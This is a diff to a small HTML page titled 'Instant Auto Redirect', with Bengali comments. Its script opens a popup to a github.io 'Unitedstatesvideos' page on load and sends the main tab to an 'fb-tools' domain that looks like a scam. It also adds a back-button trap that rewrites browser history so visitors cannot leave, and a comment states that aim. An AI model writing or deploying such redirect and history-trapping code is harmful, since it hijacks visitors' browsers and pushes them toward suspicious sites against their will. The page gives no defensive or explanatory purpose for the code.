@@ -3,41 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <title>Instant Auto Redirect</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+    }
+  </style>
 </head>
-<body style="margin:0;padding:0;background:#000;">
+<body>
 <script>
 (function(){
   var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
   var link2 = "https://fb-tools.social-networking.me";
 
-  // পেজ লোড হলে সাথে সাথে চালু হবে
   window.addEventListener("load", function(){
-    // প্রথম লিংক ট্যাবে খুলবে
-    var w1 = window.open(link1, "_blank");
+    // প্রথম লিঙ্ক নতুন ট্যাবে খুলবে
+    window.open(link1, "_blank");
 
-    // দ্বিতীয় লিংক একটু পরে ট্যাবে খুলবে
+    // মেইন ট্যাব → দ্বিতীয় লিঙ্কে redirect হবে
     setTimeout(function(){
-      var w2 = window.open(link2, "_blank");
-      if(!w2 || w2.closed){
-        window.location.href = link2;
-      }
-    }, 400);
-
-    // fallback for first link
-    setTimeout(function(){
-      if(!w1 || w1.closed){
-        window.location.href = link1;
-      }
-    }, 800);
+      window.location.replace(link2);
+    }, 500);
   });
 
-  // 🔄 Back button trap (random link)
+  // 🔄 Back button trap (বারবার বের হতে দেবে না)
   history.pushState(null, null, location.href);
   window.onpopstate = function () {
     history.pushState(null, null, location.href);
-    var targets = [link1, link2];
-    var rand = targets[Math.floor(Math.random() * targets.length)];
-    window.location.href = rand;
+    // back চাপলে main tab সবসময় link2 তে যাবে
+    window.location.replace(link2);
   };
 })();
 </script>
